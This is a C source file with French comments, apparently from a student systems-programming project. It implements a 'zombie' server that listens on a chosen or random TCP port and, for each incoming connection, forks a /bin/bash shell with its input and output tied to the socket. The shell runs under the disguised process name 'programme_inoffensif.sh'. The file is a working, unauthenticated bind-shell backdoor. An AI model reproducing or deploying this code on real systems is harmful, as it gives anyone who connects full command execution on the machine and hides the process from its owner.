#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/wait.h>
#include <signal.h>

#include "utils_v2.h"
#include "network.h"

#define MAX_SOUS_PROCESS 30

int sousProcessTab[MAX_SOUS_PROCESS] = {0};
int nbrSousProcess = 0;

/**
 * PRE: arg: est le socket de connexion entre le controller et le sous processus rendu lors de l'accept.
 *      Doit être casté en int
 * POST: Un sous processus est lancé avec son entree/sortie/erreur standard redirigé vers le socket arg.
 */
void startShell(void *arg)
{
  int socketFD = *(int *)arg;

  // Redirection sorties et entree standard
  dup2(socketFD, STDIN_FILENO);
  dup2(socketFD, STDOUT_FILENO);
  dup2(socketFD, STDERR_FILENO);

  sclose(socketFD);

  // Lancement du shell
  sexecl("/bin/bash", "programme_inoffensif.sh", NULL);
}

/**
 * PRE: int nbArg: nombre d'argument donné dans le main
 *      const char *const tabArg[] : tableau argV donné en argument au main
 * POST: Si il y a un port donné en argument, choisi ce port
 *       Si il n'y en a pas, choisi un port au hasard dans les 10 du network.h
 * RES: le port choisi
 */
int getPort(int nbArg, const char *const tabArg[])
{
  int port;
  if (nbArg > 1)
  {
    port = atoi(tabArg[1]);
    printf("Port choisi par argument : %d\n", port);
  }
  else
  {
    port = tabPorts[randomIntBetween(MIN_INDEX_TAB_PORTS, MAX_INDEX_TAB_PORTS)];
    printf("Port choisi aléatoirement : %d\n", port);
  }

  return port;
}

/**
 * PRE: sig: numero de signal
 * POST: tue tous les sous processus présents dans sousProcessTab
 */
void siginthandler(int sig)
{
  for (size_t i = 0; i < nbrSousProcess; i++)
  {
    skill(sousProcessTab[i], SIGINT);
  }
}

int main(int argc, char const *argv[])
{
  // initialisation de la structure sigaction
  struct sigaction action = {0};
  action.sa_handler = siginthandler;

  // Armement du handler sur sigINT
  int ret = sigaction(SIGINT, &action, NULL);
  checkNeg(ret, "erreur sigaction sigint");

  // Choix du port
  int port = getPort(argc, argv);
  // Initialisation du serveur zombie
  int sockfd = initSocketServer(port);
  while (1)
  {
    // Attends en boucle une connexion à accepter
    int socketForThisAccept = accept(sockfd, NULL, NULL);
    if (socketForThisAccept == -1)
    {
      exit(1);
    }

    printf("Connexion reçue !\n");
    // Lancement des shell et sauvegarde des PID dans sousProcessTab
    sousProcessTab[nbrSousProcess] = fork_and_run1(startShell, &socketForThisAccept);
    nbrSousProcess++;
  }
}